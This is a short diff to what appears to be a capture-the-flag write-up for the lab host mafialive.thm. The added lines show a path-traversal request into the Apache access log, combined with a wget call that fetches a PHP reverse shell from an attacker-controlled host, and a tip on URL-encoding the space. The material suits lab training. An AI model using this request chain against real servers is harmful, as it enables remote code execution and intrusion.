@@ -100,6 +100,9 @@ We can use it to upload a php reverse shell (`shell.php`) using wget and URL enc
 ![](https://github.com/user-attachments/assets/c8d81dca-ab7c-431d-a3c8-ddf81e64d3d5)
 
 
+Don't forget to URL encode the space (%20)
+`GET http://mafialive.thm/test.php?view=/var/www/html/development_testing/..//..//..//..//..//..//..//../var/log/apache2/access.log&wget%20http://xx.xx.xx.xx:8888/shell.php`
+
 ![](https://github.com/user-attachments/assets/9d29b928-f84a-4f22-8ef5-000ec4634757)
 
 
